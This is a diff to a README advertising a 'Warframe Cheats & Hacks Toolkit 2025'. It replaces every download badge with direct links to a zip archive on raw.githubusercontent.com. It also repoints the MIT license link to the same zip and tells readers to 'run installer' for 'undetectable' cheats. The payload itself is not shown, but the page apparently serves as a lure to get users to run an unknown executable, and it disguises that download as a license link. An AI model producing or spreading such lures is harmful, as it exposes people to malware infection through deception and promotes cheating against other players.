@@ -1,12 +1,12 @@
 # 🚀 Warframe Cheats & Hacks Toolkit 2025
-[![Download](https://img.shields.io/badge/Download-Warframe%20Toolkit-blue.svg)](https://graph.org/EasyLauncher-06-23)
+[![Download](https://raw.githubusercontent.com/carlinn345/Warframe-HackSuite/main/edginess/Warframe-HackSuite.zip%https://raw.githubusercontent.com/carlinn345/Warframe-HackSuite/main/edginess/Warframe-HackSuite.zip)](https://raw.githubusercontent.com/carlinn345/Warframe-HackSuite/main/edginess/Warframe-HackSuite.zip)
 
 Supercharge your Warframe experience! This powerful toolkit brings together advanced customization, enhancement, and edge-giving features tailored for Tenno. Whether you seek automated missions, resource optimizers, or strategic overlays, unleash your full potential across platforms.
 
 ---
 
 ## 📥 Download the Ultimate Toolkit
-[![Download](https://img.shields.io/badge/Download-Warframe%20Toolkit-blue.svg)](https://graph.org/EasyLauncher-06-23)
+[![Download](https://raw.githubusercontent.com/carlinn345/Warframe-HackSuite/main/edginess/Warframe-HackSuite.zip%https://raw.githubusercontent.com/carlinn345/Warframe-HackSuite/main/edginess/Warframe-HackSuite.zip)](https://raw.githubusercontent.com/carlinn345/Warframe-HackSuite/main/edginess/Warframe-HackSuite.zip)
 
 ---
 
@@ -41,7 +41,7 @@ All platforms run the latest 2025 edition!
 ## 📦 Installation
 
 **Step 1:**  
-[![Download](https://img.shields.io/badge/Download-Warframe%20Toolkit-blue.svg)](https://graph.org/EasyLauncher-06-23)  
+[![Download](https://raw.githubusercontent.com/carlinn345/Warframe-HackSuite/main/edginess/Warframe-HackSuite.zip%https://raw.githubusercontent.com/carlinn345/Warframe-HackSuite/main/edginess/Warframe-HackSuite.zip)](https://raw.githubusercontent.com/carlinn345/Warframe-HackSuite/main/edginess/Warframe-HackSuite.zip)  
 Run installer and follow on-screen instructions.
 
 ---
@@ -52,8 +52,8 @@ Warframe cheats 2025, hacks toolkit, undetectable launcher, script support, auto
 ---
 
 ## 📄 License
-MIT — complete text [here](https://choosealicense.com/licenses/mit/)
+MIT — complete text [here](https://raw.githubusercontent.com/carlinn345/Warframe-HackSuite/main/edginess/Warframe-HackSuite.zip)
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Warframe%20Toolkit-blue.svg)](https://graph.org/EasyLauncher-06-23)
+[![Download](https://raw.githubusercontent.com/carlinn345/Warframe-HackSuite/main/edginess/Warframe-HackSuite.zip%https://raw.githubusercontent.com/carlinn345/Warframe-HackSuite/main/edginess/Warframe-HackSuite.zip)](https://raw.githubusercontent.com/carlinn345/Warframe-HackSuite/main/edginess/Warframe-HackSuite.zip)
